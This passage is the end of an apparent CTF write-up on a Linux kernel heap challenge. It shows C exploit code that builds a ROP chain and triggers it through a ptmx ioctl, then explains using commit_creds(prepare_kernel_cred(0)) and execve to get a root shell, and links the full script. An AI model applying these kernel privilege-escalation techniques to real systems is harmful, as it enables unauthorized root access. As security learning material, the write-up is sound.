</span><span>    </span><span style=color:#f29668>*</span><span>rop</span><span style=color:#f29668>++ = </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//rax
</span><span>    </span><span style=color:#f29668>*</span><span>rop</span><span style=color:#f29668>++ = </span><span>(</span><span style=color:#ff7733>unsigned long</span><span>)priv_esc</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f29668>*</span><span>rop</span><span style=color:#f29668>++ =</span><span> user_cs</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f29668>*</span><span>rop</span><span style=color:#f29668>++ =</span><span> user_rflags</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f29668>*</span><span>rop</span><span style=color:#f29668>++ =</span><span> user_sp</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f29668>*</span><span>rop</span><span style=color:#f29668>++ =</span><span> user_ss</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>lseek</span><span>(fd</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0x100</span><span style=color:#bfbab0cc>,</span><span>SEEK_SET)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>write</span><span>(fd</span><span style=color:#bfbab0cc>,</span><span>leak_buf</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0x400</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>ioctl</span><span>(ptmx</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0xcafebabe</span><span style=color:#bfbab0cc>,</span><span>kheap</span><span style=color:#f29668>+</span><span style=color:#f29718>0x100</span><span style=color:#f29668>-</span><span style=color:#f29718>0x8</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>}
</span></code></pre><p>I used a <code>mov_rdi_rax</code> gadget which essentially moves the <code>cred_struct</code> so that we can call <code>commit_creds(prepare_kernel_cred(0))</code>.<p>One small twitch here is, for some reason, the kernel always panicked if I directly attempted to call <code>mov_rdi_rax</code> and then <code>commit_creds</code>. Hence, I included a <code>pop_rcx</code> gadget before that which (according to my dim knowledge) must be due to some stack alignment issue? Honestly, Im not really sure.<p>Finally, we get our long awaited shell. Also, for some other reason (again to my dim knowledge of the internals) <code>system("/bin/sh")</code> was also issuing recursive kernel panics, and thus had to use <code>execve</code> to get root.<h1 id=conclusion>Conclusion</h1><p>I learnt a lot about the kernel heap from this challenge and there are things in this challenge which I have to look into (for instance , the reason for using a <code>pop_rcx</code> gadget before calling <code>commit_creds</code>).<p>Full Script - <a href=https://gist.github.com/PwnVerse/3aa9ac8558f29232b04be6e5365a2901>Here</a></section></article></main></div>